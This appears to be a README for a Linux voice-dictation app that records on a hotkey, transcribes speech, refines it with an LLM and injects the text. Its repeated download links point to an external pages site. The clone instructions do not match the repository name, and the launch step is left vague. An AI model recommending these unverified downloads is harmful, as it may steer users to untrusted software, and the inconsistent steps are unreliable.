# ASR Linux v0.2.0 - Linux Voice Dictation App 2026

> **AI-assisted desktop dictation for Linux: start recording with a hotkey, convert speech to text, refine the transcript with an LLM, and send the finished text to the window currently in focus.**

[![Platform](https://img.shields.io/badge/Platform-Linux%20desktop-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v0.2.0-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/hayescalebmmq5776/asr-linux-ai-dictation?style=flat-square)](https://github.com/hayescalebmmq5776/asr-linux-ai-dictation)

---

<p align="center">
  <a href="https://hayescalebmmq5776.github.io/asr-linux-ai-dictation/">
    <img src="https://img.shields.io/badge/Download-ASR%20Linux%20Latest-brightgreen?style=for-the-badge" alt="Download ASR Linux">
  </a>
</p>

> **[Download ASR Linux v0.2.0](https://hayescalebmmq5776.github.io/asr-linux-ai-dictation/)**

---

[Download Latest Build](https://hayescalebmmq5776.github.io/asr-linux-ai-dictation/)

---

## What is ASR Linux?

ASR Linux brings speech dictation into the Linux desktop with a focused, hotkey-driven flow. Trigger recording, speak naturally, allow the application to transcribe and improve the audio, and the resulting text is inserted at the active cursor location.

The application is intended for writing notes, documents, and messages without moving between multiple utilities. It includes a local backend, a Chinese/English interface, and vocabulary tools that can be tailored to the terms and editing patterns you use most often.

---

## Highlights

- Complete hotkey workflow for recording, transcription, polishing, and text injection
- Cloud-based ASR paired with LLM transcript refinement
- User-configurable global shortcut for starting dictation
- Status overlay with live microphone-level and operation feedback
- Custom dictionary with intelligent pinyin fuzzy matching
- Transcript history actions for retrying and injecting text again
- Backend bound locally at 127.0.0.1 with secret-service credential storage
- User interface available in both Chinese and English

---

## Getting Started

Use the project download for the newest build, or clone the source when you want to review or build it yourself.

Clone the repository:

    git clone https://github.com/hayescalebmmq5776/asr-linux-ai-dictation.git
    cd asr-linux-dictation

Start the application with the launch command supplied by the project for your build. If you downloaded a release package, open the included desktop application instead.

---

## Using the App

1. Launch ASR Linux in your Linux desktop session.
2. Choose a global hotkey or verify the existing shortcut.
3. Press the shortcut to start capturing audio.
4. Speak, and stop the recording after finishing your phrase or passage.
5. Inspect the refined transcript shown in the overlay.
6. Send the completed text to the application that currently has focus.

A normal dictation session looks like this:

- Use a single shortcut to record speech
- Have ASR Linux transcribe and clean up the result
- Return to history if a previous transcript needs another injection attempt
- Add frequently used vocabulary to the dictionary to improve future recognition

---

## Settings and Local Data

Application settings and most runtime behavior are controlled through the interface and the local backend. Available configuration areas include the global shortcut, dictionary terms, and language selection.

Example configuration shape:

    {
      "hotkey": "Ctrl+Shift+Space",
      "language": "zh-CN / en-US",
      "dictionary": ["custom term", "product name"],
      "backend": "127.0.0.1"
    }

For issues involving credentials or persisted local information, review how the application uses your desktop secret-service integration and its SQLite-backed local data.

---

## System Requirements

- Linux desktop environment
- Electron-based desktop runtime
- Access to a browser or desktop session for injecting text
- Network connectivity for cloud transcription
- Local disk space for settings and history, including SQLite-backed data
- Secret-service support for secure local storage

---

## Frequently Asked Questions

### How can I assign a different hotkey?

Go to the application settings and configure a global shortcut suitable for your desktop workflow.

### Can the dictionary handle technical or uncommon vocabulary?

Yes. Add specialized words, names, and other recurring terms to the custom dictionary. Pinyin-based variants are also supported for matching.

### Does the app keep previous transcripts?

Yes. Local history provides access to earlier results and lets you retry transcription or inject a saved result again.

### How should I troubleshoot a missing overlay or failed injection?

First confirm that ASR Linux is running and that its backend is available at 127.0.0.1. Also verify that your desktop session permits text injection based on the focused window.

### Which interface languages are available?

The interface supports both Chinese and English.

---

## License

ASR Linux is distributed under the GNU GPL v3.0. See [LICENSE](LICENSE) for the full license text.
